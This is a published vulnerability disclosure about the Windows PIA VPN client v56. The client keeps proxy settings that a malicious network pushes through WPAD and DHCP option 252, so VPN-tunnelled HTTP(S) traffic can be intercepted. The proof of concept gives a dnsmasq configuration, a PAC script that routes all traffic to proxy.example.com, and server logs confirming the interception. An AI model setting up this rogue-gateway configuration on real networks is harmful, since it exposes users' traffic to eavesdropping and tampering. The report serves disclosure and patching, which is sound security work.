---
layout: post
title: PIA Client - HTTP(S) Tunnelled Traffic Interception
category: bugreports
---

Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from.

<!--more-->

*Patch notes resulting from this bug report be viewed at [https://www.privateinternetaccess.com/forum/discussion/21747/desktop-applications-release-v60](https://www.privateinternetaccess.com/forum/discussion/21747/desktop-applications-release-v60)*

<pre class="bugreport">
Description:        PIA Client HTTP(S) Tunnelled Traffic Interception
Versions Affected:  PIA Client v56 for Windows
Category:           Traffic Interception
Reporter:           Alex Chapman and Paul Stone of Context Information Security

Summary:
--------
Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from. WPAD settings configure system and application HTTP proxies via Proxy Auto-Config (PAC) scripts. This allows a malicious network operator, such as a rogue access point, to proxy all VPN-tunnelled HTTP(S) requests for PIA VPN users connecting from their network.

Analysis:
---------
A malicious network can provide proxy settings over DHCP through DHCP option 252, this option provides a URL to a PAC script. When a Windows system receives DHCP option 252, the advertised PAC script is downloaded and the proxy settings are configured. When the client initialises a VPN connection to PIA this configuration remains.

Before VPN connection: client -&gt; malicious network -&gt; PAC proxy -&gt; internet
                                         ^
                                 DHCP 252 Proxy set

After VPN connection:  client -&gt; malicious network -&gt; VPN server -&gt; PAC proxy -&gt; internet
                                         ^
                                 DHCP 252 Proxy set

The "PAC proxy" can log all traffic, defeating the confidentiality provided by PIA, or modify traffic in transit to affect the integrity of the VPN traffic.

PIA Client v56 for Windows is based on OpenVPN version 2.2.2. This issue appears to be an underlying issue in OpenVPN (confirmed in OpenVPN version 2.3.10); we have reported this issue to the OpenVPN security team. However, as this issue was originally identified on the PIA Client we would like to inform London Trust Media of the details.

This issue has been confirmed on Windows 10 and Windows 7 (under default configuration) with PIA Client v56. WPAD/PAC is enabled by default on all modern desktop versions of Windows. It should be noted that disabling the default "Automatically detect settings" option in the Windows "Local Area Network (LAN) Settings" configuration mitigates this issue. However, clients with specifically configured PAC files (using the "Use automatic configuration script" option in the Windows "Local Area Network (LAN) Settings" configuration) may still be at risk.

Proof of Concept:
-----------------
Provided here is a Proof of Concept setup which will act as a network gateway, providing a PAC script via DHCP. The PAC script sets the default proxy to an HTTP proxy on the internet, in this case a fictitious proxy at proxy.example.com. When a Windows system attaches to this network, the advertised PAC file will be downloaded and the proxy settings configured. When the system connects to the PIA VPN service we can see that the proxy setting are still honoured.

The following dnsmasq configuration can be used to provide a PAC file to Windows hosts via WPAD DHCP:
    interface=eth0
    dhcp-authoritative
    dhcp-range=192.168.100.100,192.168.100.199,10m
    dhcp-option=3,192.168.100.1
    dhcp-option=6,192.168.100.1
    dhcp-option=252,http://proxy.example.com:80/proxy.pac

The dhcp-option=252 option specifies the URL from which Windows hosts will download the PAC script.

The following PAC script can be can be provided to proxy all HTTP(S) traffic through a Web Proxy hosted at proxy.example.com:3128:

  function FindProxyForURL(url, host){
    return "PROXY proxy.example.com:3128";
  }

Windows hosts which connect to a network as configured above will, by default, push all HTTP(S) traffic through the HTTP proxy at proxy.example.com:3128. After a PIA VPN connection is established the WPAD/PAC settings remain in use, forwarding all VPN tunnelled HTTP(S) traffic out of the PIA VPN endpoint through the configured HTTP proxy.

Below are logs which show HTTP connections from the above configured network to the WPAD/PAC configured proxy occurring both pre and post VPN connection.

Nginx access logs of Windows and Google Chrome fetching PAC script before connecting to the VPN:
    88.98.79.12 - - [08/Apr/2016:09:33:45 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "WinHttp-Autoproxy-Service/5.1"
    88.98.79.12 - - [08/Apr/2016:09:34:14 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
    88.98.79.12 - - [08/Apr/2016:09:34:15 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"

Squid-cache access logs of proxy connections for www.contextis.com before connecting to the VPN:
    156 88.98.79.12 TCP_MISS/304 475 GET http://www.contextis.com/ - HIER_DIRECT/93.184.216.34 -

Nginx access logs of Windows and Google Chrome fetching PAC script after connecting to the PIA VPN:
    46.28.53.168 - - [08/Apr/2016:09:35:55 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "WinHttp-Autoproxy-Service/5.1"
    46.28.53.168 - - [08/Apr/2016:09:36:00 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
    46.28.53.168 - - [08/Apr/2016:09:36:01 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"

Squid-cache access logs of proxy connections for www.contextis.com after connecting to the PIA VPN:
    151 46.28.53.168 TCP_MISS/304 453 GET http://www.contextis.com/ - HIER_DIRECT/93.184.216.34 -

NOTE: The IP address on the "after" logs have changed to that of the VPN end point.
</pre>
